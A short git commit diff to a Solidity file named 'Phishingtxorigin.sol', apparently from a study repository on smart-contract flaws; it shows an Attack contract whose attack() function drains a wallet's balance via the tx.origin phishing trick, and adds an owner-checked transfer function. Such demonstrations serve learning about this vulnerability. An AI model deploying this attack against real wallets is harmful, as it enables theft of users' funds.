d0c01c000f497e583ff343c8d0b14c1c03f5ebb0
jinwon93 <kjw8208@nate.com>
2022-06-23 21:43:02 +0900

    20220623

--- Applications/Phishingtxorigin.sol
+++ Applications/Phishingtxorigin.sol
@@ -31,4 +31,13 @@ contract Attack {
     function attack() public {
         wallet.transfer(owner, address(wallet).balance);
     }
+    
+    function transfer(address payable _to, uint256 _amount) public {
+    require(msg.sender == owner, "Not owner");
+
+    (bool sent, ) = _to.call{value: _amount}("");
+    require(sent, "Failed to send Ether");
+    }
 }
+
+
